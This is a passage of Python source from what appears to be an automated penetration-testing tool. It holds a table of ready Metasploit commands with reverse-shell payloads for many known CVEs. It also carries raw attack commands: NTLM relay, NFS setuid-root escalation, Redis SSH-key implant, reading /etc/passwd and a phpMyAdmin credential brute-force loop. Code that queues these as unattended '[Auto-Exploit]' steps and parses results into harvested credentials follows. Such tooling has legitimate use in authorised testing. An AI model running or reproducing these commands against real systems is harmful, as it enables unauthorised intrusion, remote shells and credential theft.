    (r'vsftpd.*backdoor|vsftpd 2\.3\.4',
     "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {rhost}\nrun"),
    (r'samba.*usermap|cve-2007-2447',
     "use exploit/multi/samba/usermap_script\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'bluekeep|cve-2019-0708',
     "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS {rhost}\nset PAYLOAD windows/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'apache.*2\.4\.4[89]|cve-2021-4177[23]|path traversal.*rce',
     "use exploit/multi/http/apache_normalize_path_rce\nset RHOSTS {rhost}\nset PAYLOAD linux/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'drupalgeddon|cve-2018-7600',
     "use exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS {rhost}\nset PAYLOAD php/reverse_php\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'log4shell|cve-2021-44228',
     "use exploit/multi/misc/log4shell_header_injection\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'shellshock|cve-2014-6271',
     "use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS {rhost}\nset PAYLOAD linux/x86/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'distcc.*rce|cve-2004-2687',
     "use exploit/unix/misc/distcc_exec\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'unrealircd.*backdoor',
     "use exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'tomcat.*cred|tomcat.*manager',
     "use exploit/multi/http/tomcat_mgr_upload\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'heartbleed|cve-2014-0160',
     "use auxiliary/scanner/ssl/openssl_heartbleed\nset RHOSTS {rhost}\nset ACTION DUMP\nrun"),
    (r'jboss.*invoke|cve-2010-0738',
     "use exploit/multi/http/jboss_invoke_deploy\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'smb.*signing.*deshabilitado|smb signing disabled',
     "# NTLM Relay:\nresponder -I eth0 -rdwv &\nntlmrelayx.py -tf /tmp/targets.txt -smb2support"),
    (r'nfs.*no_root_squash',
     "# NFS no_root_squash:\nmount -t nfs {rhost}:/share /mnt/nfs\ncp /bin/bash /mnt/nfs/ && chmod +s /mnt/nfs/bash\n# En el target: /mnt/nfs/bash -p"),
    (r'redis.*sin autenticaci|redis.*no.auth',
     "# Redis RCE via SSH keys:\nredis-cli -h {rhost} config set dir /root/.ssh/\nredis-cli -h {rhost} config set dbfilename authorized_keys\nredis-cli -h {rhost} set key \"$(cat ~/.ssh/id_rsa.pub)\"\nredis-cli -h {rhost} save"),
    (r'spring4shell|cve-2022-22965',
     "use exploit/multi/http/spring_framework_rce_spring4shell\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'confluence.*ognl|cve-2022-26134',
     "use exploit/multi/http/confluence_namespace_ognl_injection\nset RHOSTS {rhost}\nset PAYLOAD linux/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'webmin.*backdoor|cve-2019-15107',
     "use exploit/linux/http/webmin_backdoor\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'smb.*ghost|cve-2020-0796',
     "use exploit/windows/smb/cve_2020_0796_smbghost\nset RHOSTS {rhost}\nset PAYLOAD windows/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'vsftpd.*2\.3\.4|vsftpd 2\.3\.4|vsftpd.*backdoor',
     "use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/interact\nrun"),
    (r'ms17.010|eternalblue|cve-2017-0144',
     "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS {rhost}\nset PAYLOAD windows/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nset AutoCheck false\nrun"),
    (r'ms08.067|cve-2008-4250|netapi',
     "use exploit/windows/smb/ms08_067_netapi\nset RHOSTS {rhost}\nset PAYLOAD windows/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'samba.*3\.0\.[0-9]|samba.*2\.|usermap.*script',
     "use exploit/multi/samba/usermap_script\nset RHOSTS {rhost}\nset PAYLOAD cmd/unix/reverse_netcat\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'php.*cgi.*cve-2012-1823|php.*cgi.*rce',
     "use exploit/multi/http/php_cgi_arg_injection\nset RHOSTS {rhost}\nset PAYLOAD php/reverse_php\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'struts.*ognl|cve-2017-5638|cve-2018-11776',
     "use exploit/multi/http/struts2_content_type_ognl\nset RHOSTS {rhost}\nset PAYLOAD linux/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'rails.*cookie.*deseri|cve-2019-5420',
     "use exploit/multi/http/rails_secret_deserialization\nset RHOSTS {rhost}\nset PAYLOAD linux/x64/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'jenkins.*script.*console|jenkins.*rce',
     "use exploit/multi/http/jenkins_script_console\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'elasticsearch.*no.auth|elasticsearch.*unauthenticated',
     "# Elasticsearch no-auth data dump:\ncurl -s http://{rhost}:9200/_cat/indices?v; curl -s http://{rhost}:9200/_all/_search?pretty&size=5"),
    (r'mysql.*empty.*password|mysql.*root.*no.*password|mysql.*no.*auth',
     "# MySQL empty root:\nmysql -h {rhost} -u root --password='' -e 'show databases; select user,host,authentication_string from mysql.user; select @@version; SELECT INTO OUTFILE exploitation available'"),
    (r'postgres.*no.*password|postgres.*trust|pgsql.*empty',
     "# PostgreSQL trust auth:\npsql -h {rhost} -U postgres -c '\\\\l; SELECT version(); SELECT pg_read_file(\\''/etc/passwd'\\'')'"),
    (r'mongodb.*no.*auth|mongodb.*unauthenticated',
     "# MongoDB no-auth:\nmongosh --host {rhost} --eval 'db.adminCommand({listDatabases:1})' 2>/dev/null || mongo {rhost}:27017 --eval 'show dbs'"),
    (r'tomcat.*manager.*exposed|tomcat.*default.*cred',
     "use exploit/multi/http/tomcat_mgr_upload\nset RHOSTS {rhost}\nset PAYLOAD java/shell_reverse_tcp\nset LHOST {lhost}\nset LPORT {lport}\nrun"),
    (r'phpmyadmin.*exposed|phpmyadmin.*default|phpmyadmin.*root',
     "# phpMyAdmin default creds:\nfor u in root admin phpmyadmin; do for p in '' root admin password toor; do curl -s -c /tmp/pma.jar -X POST 'http://{rhost}/phpmyadmin/index.php' -d \"pma_username=$u&pma_password=$p\" | grep -q 'pmahome\\|logout' && echo PHPMYADMIN_CREDS:$u:$p && break 2; done; done"),
]


def _attach_msf_command(finding, rhost, vars_dict):
    """Attach auto-generated exploit command to a finding when a known module matches."""
    text = f"{finding.get('title','')} {finding.get('description','')} {finding.get('cve','')}".lower()
    lhost = vars_dict.get("lhost", "YOUR_LHOST")
    lport = vars_dict.get("lport", "4444")
    for pattern, cmd_tpl in _MSF_AUTO_CMDS:
        if re.search(pattern, text, re.IGNORECASE):
            finding["exploit_cmd"] = (
                cmd_tpl
                .replace("{rhost}", rhost)
                .replace("{lhost}", lhost)
                .replace("{lport}", lport)
            )
            break


def _inject_exploitation_steps(steps, injected, findings, vars_dict, rhost):
    """Inject exploitation steps for detected vulnerabilities that have exploit_cmd."""
    lhost = vars_dict.get("lhost", "")
    lport = vars_dict.get("lport", "4444")

    for finding in findings:
        exploit_cmd = finding.get("exploit_cmd", "")
        if not exploit_cmd:
            continue
        title = finding.get("title", "")
        exploit_key = f"exploit_{re.sub(r'[^a-z0-9]', '_', title.lower())[:40]}"
        if exploit_key in injected:
            continue

        # Only inject MSF exploits (use exploit/...) — skip suggestions/comments
        if "use exploit/" in exploit_cmd or "use auxiliary/" in exploit_cmd:
            safe_cmd = exploit_cmd.replace("'", '"')
            steps.append({
                "name": f"[Auto-Exploit] {title[:60]}",
                "command": f"msfconsole -q -x '{safe_cmd}; exit' 2>/dev/null",
                "parse": "msf_exploit",
            })
            injected.add(exploit_key)

        # Non-MSF direct exploits (redis, ftp, etc.)
        elif any(t in exploit_cmd for t in ("redis-cli", "ftp -n", "nc -w")):
            steps.append({
                "name": f"[Auto-Exploit] {title[:60]}",
                "command": exploit_cmd,
                "parse": "exploit_result",
            })
            injected.add(exploit_key)


def _inject_followup_steps(steps, injected, port_nums, rhost):
    """Dynamically append follow-up scan steps based on discovered ports."""
    if (port_nums & {80, 443, 8080, 8443, 8000, 8888}) and "nuclei_web" not in injected:
        steps.append({
            "name": "[Auto] Nuclei Web Vuln Scan",
            "command": (
                f"nuclei -u http://{rhost} -u https://{rhost} "
                f"-severity critical,high,medium -j -timeout 10 -no-color 2>/dev/null || "
                f"nuclei -u http://{rhost} -severity critical,high,medium -j 2>/dev/null || true"
            ),
            "parse": "nuclei",
        })
        steps.append({
            "name": "[Auto] HTTP Vuln Scripts",
            "command": (
                f"nmap -T4 -p 80,443,8080,8443 "
                f"--script=http-shellshock,http-phpmyadmin-dir-traversal,"
                f"http-vuln-cve2017-5638,http-auth-finder,http-backup-finder,"
                f"http-git,http-config-backup {rhost}"
            ),
            "parse": "nmap",
        })
        injected.add("nuclei_web")

    if (port_nums & {445, 139}) and "smb_vuln" not in injected:
        steps.append({
            "name": "[Auto] SMB Vuln Check (MS17-010/MS08-067/Signing)",
            "command": (
                f"nmap -T4 -p 445,139 "
                f"--script=smb-vuln-ms17-010,smb-vuln-ms08-067,"
                f"smb-vuln-cve2009-3103,smb-security-mode,smb2-security-mode {rhost}"
            ),
            "parse": "nmap",
        })
        injected.add("smb_vuln")

    if 22 in port_nums and "ssh_vuln" not in injected:
        steps.append({
            "name": "[Auto] SSH Audit",
            "command": f"nmap -T4 -p 22 --script=ssh-auth-methods,ssh2-enum-algos,sshv1 {rhost}",
            "parse": "nmap",
        })
        injected.add("ssh_vuln")

    if 3389 in port_nums and "rdp_vuln" not in injected:
        steps.append({
            "name": "[Auto] RDP BlueKeep Check",
            "command": f"nmap -T4 -p 3389 --script=rdp-vuln-ms12-020,rdp-enum-encryption {rhost}",
            "parse": "nmap",
        })
        injected.add("rdp_vuln")

    if 3306 in port_nums and "mysql_check" not in injected:
        steps.append({
            "name": "[Auto] MySQL Empty Password",
            "command": f"nmap -T4 -p 3306 --script=mysql-empty-password,mysql-databases,mysql-info {rhost}",
            "parse": "nmap",
        })
        injected.add("mysql_check")

    if 6379 in port_nums and "redis_check" not in injected:
        steps.append({
            "name": "[Auto] Redis No-Auth Check",
            "command": (
                f"redis-cli -h {rhost} ping 2>/dev/null && echo 'REDIS_NO_AUTH_CONFIRMED' "
                f"|| echo 'Redis requires authentication'"
            ),
            "parse": "nmap",
        })
        injected.add("redis_check")

    if 21 in port_nums and "ftp_check" not in injected:
        steps.append({
            "name": "[Auto] FTP Anonymous + Backdoor",
            "command": f"nmap -T4 -p 21 --script=ftp-anon,ftp-vsftpd-backdoor,ftp-proftpd-backdoor {rhost}",
            "parse": "nmap",
        })
        injected.add("ftp_check")

    if 2049 in port_nums and "nfs_check" not in injected:
        steps.append({
            "name": "[Auto] NFS Shares",
            "command": (
                f"nmap -T4 -p 2049 --script=nfs-showmount,nfs-ls,nfs-statfs {rhost} 2>/dev/null; "
                f"showmount -e {rhost} 2>/dev/null"
            ),
            "parse": "nmap",
        })
        injected.add("nfs_check")

    if 161 in port_nums and "snmp_check" not in injected:
        steps.append({
            "name": "[Auto] SNMP Community Check",
            "command": (
                f"onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt {rhost} 2>/dev/null; "
                f"snmpwalk -v2c -c public {rhost} 2>/dev/null | head -50"
            ),
            "parse": "nmap",
        })
        injected.add("snmp_check")

    if (port_nums & {1433, 5432}) and "sql_check" not in injected:
        steps.append({
            "name": "[Auto] MSSQL/PostgreSQL Auth Check",
            "command": (
                f"nmap -T4 -p 1433,5432 "
                f"--script=ms-sql-empty-password,ms-sql-info,pgsql-brute {rhost} 2>/dev/null"
            ),
            "parse": "nmap",
        })
        injected.add("sql_check")


def _parse_tool_output(tool, output_text, rhost="", job_name=""):
    loot      = []
    suggestions = []
    open_ports  = []
    findings    = []   # auto-detected vulnerabilities

    # ── Nmap open ports + instant version-based CVE detection ────────────────
    nmap_re = re.compile(r'^(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)', re.MULTILINE)
    _seen_version_findings = set()
    for m in nmap_re.finditer(output_text):
        port, proto, svc, ver = int(m.group(1)), m.group(2), m.group(3), m.group(4).strip()
        open_ports.append({"port": port, "proto": proto, "service": svc, "version": ver})
        loot.append({"type": "note", "value": f"{port}/{proto} {svc} {ver}".strip(), "source": rhost or "nmap"})
        # Instant CVE match from version string
        _vf = _match_version_cve({"port": port, "proto": proto, "service": svc, "version": ver}, rhost)
        if _vf and _vf["title"] not in _seen_version_findings:
            _seen_version_findings.add(_vf["title"])
            findings.append(_vf)

    port_nums = {p["port"] for p in open_ports}
    if port_nums & {80, 443, 8080, 8443, 8000}:
        suggestions.append({"tools": ["Gobuster", "Nikto", "WhatWeb", "Nuclei"], "reason": "HTTP/HTTPS detectado"})
    if port_nums & {445, 139}:
        suggestions.append({"tools": ["SMBMap", "CrackMapExec", "enum4linux-ng", "nmap smb-vuln-*"], "reason": "SMB detectado"})
    if 22 in port_nums:
        suggestions.append({"tools": ["Hydra SSH", "ssh-audit"], "reason": "SSH detectado"})
    if 21 in port_nums:
        suggestions.append({"tools": ["FTP Anonymous Login", "nmap ftp-anon"], "reason": "FTP detectado"})
    if port_nums & {389, 636, 3268}:
        suggestions.append({"tools": ["LDAP Enum", "BloodHound", "ldapdomaindump"], "reason": "LDAP/AD detectado"})
    if 3389 in port_nums:
        suggestions.append({"tools": ["xfreerdp", "BlueKeep Check", "nmap rdp-vuln-*"], "reason": "RDP detectado"})
    if port_nums & {1433, 3306, 5432}:
        suggestions.append({"tools": ["SQL Enum", "sqsh/mysql/psql"], "reason": "Base de datos detectada"})
    if 161 in port_nums:
        suggestions.append({"tools": ["snmpwalk", "onesixtyone"], "reason": "SNMP detectado"})

    # ── Nmap VULNERABLE blocks (--script=vuln output) ─────────────────────────
    HIGH_RISK_SCRIPTS = {
        'ms17-010': ('critical', 'CVE-2017-0143', 'EternalBlue — RCE sin autenticación en SMBv1'),
        'ms08-067': ('critical', 'CVE-2008-4250', 'MS08-067 — RCE sin autenticación (Windows XP/2003)'),
        'cve2009-3103': ('critical', 'CVE-2009-3103', 'SMBv2 DoS/RCE (Vista/2008)'),
        'ms12-020': ('high', 'CVE-2012-0152', 'MS12-020 — RDP DoS/RCE'),
        'shellshock': ('critical', 'CVE-2014-6271', 'Shellshock — RCE via Bash CGI'),
        'vsftpd-backdoor': ('critical', '', 'VSFTPD 2.3.4 Backdoor — RCE'),
        'unrealircd-backdoor': ('critical', '', 'UnrealIRCd Backdoor — RCE'),
        'heartbleed': ('high', 'CVE-2014-0160', 'Heartbleed — fuga de memoria OpenSSL'),
        'bluekeep': ('critical', 'CVE-2019-0708', 'BlueKeep — RCE sin autenticación en RDP'),
        'eternal': ('critical', 'CVE-2017-0144', 'EternalBlue variant'),
    }

    # Match nmap vuln script VULNERABLE blocks
    # nmap outputs script results as consecutive lines starting with |
    # e.g.:  | smb-vuln-ms17-010:\n|   VULNERABLE:\n|   Remote Code Execution...
    vuln_block_re = re.compile(r'\|\s+([\w\-]+):\s*\r?\n((?:\|[^\n]*\n)+)', re.MULTILINE)
    for m in vuln_block_re.finditer(output_text):
        block = m.group(0)
        if not re.search(r'VULNERABLE', block, re.IGNORECASE):
            continue
        script = m.group(1).lower()
        cve_m = re.search(r'CVE[:\-](\d{4}[:\-]\d+)', block, re.IGNORECASE)
        cve = f"CVE-{cve_m.group(1).replace(':', '-')}" if cve_m else ""

        severity = "high"
        desc = f"Nmap script {m.group(1)} reportó el host como VULNERABLE."
        for key, (sev, default_cve, explain) in HIGH_RISK_SCRIPTS.items():
            if key in script:
                severity = sev
                if not cve:
                    cve = default_cve
                desc = explain
                break

        findings.append({
            "id": str(uuid.uuid4()), "title": f"[{m.group(1)}] Host VULNERABLE",
            "severity": severity, "status": "open",
            "cve": cve, "cvss": None,
            "description": desc,
            "evidence": block[:600].strip(),
            "hosts": [rhost] if rhost else [],
            "source": "nmap-vuln",
        })

    # ── FTP anonymous login ───────────────────────────────────────────────────
    if re.search(r'ftp-anon.*Anonymous login allowed|Anonymous FTP login allowed|Anonymous.*login.*allowed', output_text, re.IGNORECASE):
        ev_m = re.search(r'(ftp-anon[^\n]+)', output_text, re.IGNORECASE)
        findings.append({
            "id": str(uuid.uuid4()), "title": "FTP — Login Anónimo Permitido",
            "severity": "high", "status": "open", "cve": "", "cvss": 7.5,
            "description": "El servidor FTP acepta login anónimo. Permite listar y descargar archivos sin credenciales.",
            "evidence": ev_m.group(0) if ev_m else "", "hosts": [rhost] if rhost else [], "source": "nmap-ftp-anon",
        })

    # ── vsftpd backdoor confirmed ─────────────────────────────────────────────
    if re.search(r'ftp-vsftpd-backdoor|vsftpd 2\.3\.4.*backdoor|vsftpd.*backdoor|vsftpd_234', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "FTP — vsftpd 2.3.4 Backdoor CONFIRMADO",
            "severity": "critical", "status": "open", "cve": "", "cvss": 10.0,
            "description": "vsftpd 2.3.4 backdoor confirmado. El puerto 6200 está abierto y acepta comandos shell.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "exploit-direct",
        })

    # ── LFI confirmed ─────────────────────────────────────────────────────────
    if re.search(r'LFI FOUND|root:x:0:0.*bash', output_text, re.IGNORECASE):
        ev_m = re.search(r'(LFI FOUND[^\n]*)', output_text)
        findings.append({
            "id": str(uuid.uuid4()), "title": "Web — LFI (Local File Inclusion) Confirmado",
            "severity": "high", "status": "open", "cve": "", "cvss": 7.5,
            "description": "Local File Inclusion confirmado. Es posible leer archivos arbitrarios del servidor (/etc/passwd leído).",
            "evidence": ev_m.group(0) if ev_m else "root:x:0:0 detected in response",
            "hosts": [rhost] if rhost else [], "source": "lfi-check",
        })

    # ── .git exposed ─────────────────────────────────────────────────────────
    if re.search(r'ref: refs/heads|\.git.*200|git.*HEAD.*ref:', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "Web — Directorio .git Expuesto",
            "severity": "high", "status": "open", "cve": "", "cvss": 7.5,
            "description": "El directorio .git es accesible públicamente. Posible extracción de código fuente y secretos.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "web-check",
        })

    # ── SMB signing disabled ──────────────────────────────────────────────────
    if re.search(r'message[_ ]signing.*disabled|signing.*False|SMB.*signing.*not required|Message signing enabled but not required', output_text, re.IGNORECASE):
        ev_m = re.search(r'([^\n]*signing[^\n]*)', output_text, re.IGNORECASE)
        findings.append({
            "id": str(uuid.uuid4()), "title": "SMB Signing Deshabilitado",
            "severity": "medium", "status": "open", "cve": "", "cvss": 5.9,
            "description": "SMB signing está deshabilitado. Vulnerable a NTLM relay (Responder+ntlmrelayx, PetitPotam).",
            "evidence": ev_m.group(0).strip() if ev_m else "",
            "hosts": [rhost] if rhost else [], "source": "nmap-smb",
        })

    # ── SMB null session / enum4linux ─────────────────────────────────────────
    if re.search(r'account_used:\s*(<blank>|guest)|null session|Got domain/workgroup name', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "SMB Null Session / Enumeración Anónima",
            "severity": "medium", "status": "open", "cve": "", "cvss": 5.3,
            "description": "SMB acepta sesión nula (null session). Permite enumerar usuarios, grupos, shares y políticas.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "enum4linux",
        })

    # ── enum4linux users found ────────────────────────────────────────────────
    users_found = re.findall(r'user:\s*\[([^\]]+)\].*rid:\s*\[([^\]]+)\]', output_text, re.IGNORECASE)
    if users_found:
        ulist = ", ".join(u[0] for u in users_found[:10])
        loot.append({"type": "note", "value": f"SMB users: {ulist}", "source": "enum4linux"})
        findings.append({
            "id": str(uuid.uuid4()), "title": f"SMB — {len(users_found)} usuarios enumerados via RID",
            "severity": "medium", "status": "open", "cve": "", "cvss": 5.0,
            "description": f"Usuarios enumerados via RID brute: {ulist}",
            "evidence": "\n".join(f"user:[{u[0]}] rid:[{u[1]}]" for u in users_found[:10]),
            "hosts": [rhost] if rhost else [], "source": "enum4linux",
        })

    # ── CrackMapExec / NXC Pwn3d! ────────────────────────────────────────────
    for m in re.finditer(r'(\S+)\s+\[\+\]\s+(\S+\\?\S+):(\S+)\s+\(Pwn3d!\)', output_text):
        user_domain, pwd = m.group(2), m.group(3)
        loot.append({"type": "credential", "value": f"{user_domain}:{pwd}", "source": "crackmapexec"})
        findings.append({
            "id": str(uuid.uuid4()), "title": f"SMB Admin Access Confirmado — {user_domain}",
            "severity": "critical", "status": "open", "cve": "", "cvss": 10.0,
            "description": f"Credenciales con privilegios de administrador local confirmadas via CrackMapExec: {user_domain}",
            "evidence": m.group(0), "hosts": [rhost] if rhost else [], "source": "crackmapexec",
        })

    # ── MySQL empty root password ─────────────────────────────────────────────
    if re.search(r'mysql-empty-password.*root|account.*has empty password|Login.*root.*success.*password.*empty', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "MySQL — Root sin Contraseña",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "MySQL acepta conexión como root sin contraseña. Acceso completo a todas las bases de datos.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "nmap-mysql",
        })

    # ── MySQL databases found ─────────────────────────────────────────────────
    mysql_dbs = re.findall(r'^\|\s+([a-zA-Z0-9_]+)\s*$', output_text, re.MULTILINE)
    if mysql_dbs and re.search(r'mysql-databases|information_schema', output_text, re.IGNORECASE):
        loot.append({"type": "note", "value": f"MySQL databases: {', '.join(mysql_dbs[:10])}", "source": "nmap-mysql"})

    # ── Redis no-auth confirmed ────────────────────────────────────────────────
    if re.search(r'REDIS_NO_AUTH_CONFIRMED|redis.*PONG|redis.*connected.*0.*keys', output_text, re.IGNORECASE):
        ev_m = re.search(r'(REDIS_NO_AUTH_CONFIRMED|[^\n]*PONG[^\n]*)', output_text)
        findings.append({
            "id": str(uuid.uuid4()), "title": "Redis — Acceso Sin Autenticación",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "Redis no requiere autenticación. RCE posible via cron job o SSH authorized_keys.",
            "evidence": ev_m.group(0).strip() if ev_m else "",
            "hosts": [rhost] if rhost else [], "source": "redis-check",
        })

    # ── MongoDB no-auth ───────────────────────────────────────────────────────
    if re.search(r'mongodb.*databases|listDatabases.*ok.*1|Implicit session', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "MongoDB — Acceso Sin Autenticación",
            "severity": "high", "status": "open", "cve": "", "cvss": 7.5,
            "description": "MongoDB accesible sin autenticación. Todos los datos expuestos.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "mongodb-check",
        })

    # ── SNMP default community string ─────────────────────────────────────────
    if re.search(r'snmp.*public.*\d+\.\d+|community.*public.*open|snmpwalk.*SNMPv', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "SNMP — Community String 'public' Aceptada",
            "severity": "medium", "status": "open", "cve": "", "cvss": 5.3,
            "description": "SNMP responde con community string 'public'. Permite enumerar sistema, interfaces, ARP, usuarios.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "snmp-check",
        })

    # ── NFS no_root_squash / mounts ──────────────────────────────────────────
    nfs_exports = re.findall(r'(/[/\w]+)\s+\*|\s+(no_root_squash)', output_text)
    if nfs_exports or re.search(r'showmount.*Export list|nfs-showmount.*/', output_text, re.IGNORECASE):
        no_squash = 'no_root_squash' in output_text
        sev = "critical" if no_squash else "high"
        findings.append({
            "id": str(uuid.uuid4()), "title": f"NFS — Shares Exportados{'  (no_root_squash)' if no_squash else ''}",
            "severity": sev, "status": "open", "cve": "", "cvss": 9.0 if no_squash else 7.0,
            "description": f"NFS exports accesibles{' con no_root_squash (root local = root en share)' if no_squash else ''}. Mountable sin auth.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "nfs-check",
        })

    # ── VNC no auth / weak auth ────────────────────────────────────────────────
    if re.search(r'VNC.*security type.*None|Authentication.*None|vnc-brute.*\+.*:.*', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "VNC — Sin Autenticación / Credenciales Débiles",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "VNC accesible sin contraseña o con credenciales débiles. Acceso de escritorio remoto completo.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "vnc-check",
        })

    # ── DNS zone transfer ─────────────────────────────────────────────────────
    if re.search(r'Zone Transfer.*success|Transfer failed.*0 records.*\n.*\w+\s+IN|AXFR.*answer', output_text, re.IGNORECASE):
        findings.append({
            "id": str(uuid.uuid4()), "title": "DNS — Zone Transfer Permitido",
            "severity": "high", "status": "open", "cve": "", "cvss": 7.5,
            "description": "El servidor DNS permite transferencias de zona (AXFR). Exposición completa de registros DNS.",
            "evidence": "", "hosts": [rhost] if rhost else [], "source": "dns-axfr",
        })

    # ── SQLi confirmed (sqlmap / direct) ─────────────────────────────────────
    if re.search(r'sqlmap.*injectable|parameter.*is vulnerable|sql.*injection.*found|injection.*point.*found', output_text, re.IGNORECASE):
        ev_m = re.search(r'([^\n]*parameter[^\n]*injectable[^\n]*|[^\n]*sql.*inject[^\n]*)', output_text, re.IGNORECASE)
        findings.append({
            "id": str(uuid.uuid4()), "title": "Web — SQL Injection Confirmado",
            "severity": "critical", "status": "open", "cve": "", "cvss": 9.8,
            "description": "SQL Injection encontrado. Posible extracción completa de base de datos, bypass de auth, RCE.",
            "evidence": ev_m.group(0)[:200] if ev_m else "",
            "hosts": [rhost] if rhost else [], "source": "sqlmap",
        })

    # ── distccd RCE ───────────────────────────────────────────────────────────
    if re.search(r'distcc.*uid=|distcc.*id=\d+', output_text, re.IGNORECASE):
        ev_m = re.search(r'(uid=\d+[^\n]*)', output_text)
        findings.append({
            "id": str(uuid.uuid4()), "title": "distccd — RCE Confirmado (CVE-2004-2687)",
            "severity": "critical", "status": "open", "cve": "CVE-2004-2687", "cvss": 9.3,
            "description": "distccd ejecuta comandos remotos sin autenticación.",
            "evidence": ev_m.group(0) if ev_m else "",
            "hosts": [rhost] if rhost else [], "source": "distccd-exploit",
        })

    # ── CrackMapExec / NXC valid creds (non-admin) ────────────────────────────
    for m in re.finditer(r'\[\+\]\s+(\S+)\s+(\S+\\?\S+):(\S{2,})\s*$', output_text, re.MULTILINE):
        if "Pwn3d" not in m.group(0):
            val = f"{m.group(2)}:{m.group(3)}"
            if val not in {i['value'] for i in loot}:
                loot.append({"type": "credential", "value": val, "source": "crackmapexec"})

    # ── Nikto findings ────────────────────────────────────────────────────────
    SKIP_NIKTO = {'server:', 'retrieved x-powered-by', 'no cgi', 'end of', 'start time',
                  'target ip:', 'target hostname:', '0 error'}
    for m in re.finditer(r'^\+\s+(.+)', output_text, re.MULTILINE):
        line = m.group(1).strip()
        if any(skip in line.lower() for skip in SKIP_NIKTO) or len(line) < 15:
            continue
        sev = "low"
        if any(w in line.lower() for w in ['injection', 'xss', 'rce', 'remote code', 'exec', 'upload']):
            sev = "high"
        elif any(w in line.lower() for w in ['interesting', 'admin', 'login', 'password', 'backup', '.git', '.env', 'debug']):
            sev = "medium"
        cve_m = re.search(r'(CVE-[\d-]+)', line)
        findings.append({
            "id": str(uuid.uuid4()), "title": f"Nikto: {line[:80]}",
            "severity": sev, "status": "open",
            "cve": cve_m.group(1) if cve_m else "", "cvss": None,
            "description": line, "evidence": "",
            "hosts": [rhost] if rhost else [], "source": "nikto",
        })

    # ── Nuclei findings — JSON mode (-j) preferred, text fallback ────────────
    _nuclei_json_found = False
    for _nline in output_text.splitlines():
        _nline = _nline.strip()
        if not _nline.startswith('{'):
            continue
        try:
            nd = json.loads(_nline)
        except (json.JSONDecodeError, ValueError):
            continue
        info = nd.get('info', {})
        clf = info.get('classification', {})
        sev = info.get('severity', 'info').lower()
        if sev not in ('critical', 'high', 'medium', 'low'):
            sev = 'info'
        cve_list = clf.get('cve-id') or []
        if isinstance(cve_list, str):
            cve_list = [cve_list]
        cve = cve_list[0] if cve_list else ''
        cvss = clf.get('cvss-score')
        tid = nd.get('template-id', '') or nd.get('template', '')
        name = info.get('name', tid) or tid
        desc = (info.get('description') or '').strip()
        matched_at = nd.get('matched-at') or nd.get('host') or rhost
        req = (nd.get('request') or '')[:400]
        resp = (nd.get('response') or '')[:600]
        curl_cmd = (nd.get('curl-command') or '')[:300]
        ev_parts = [f"Matched: {matched_at}"]
        if curl_cmd:
            ev_parts.append(f"Curl:\n{curl_cmd}")
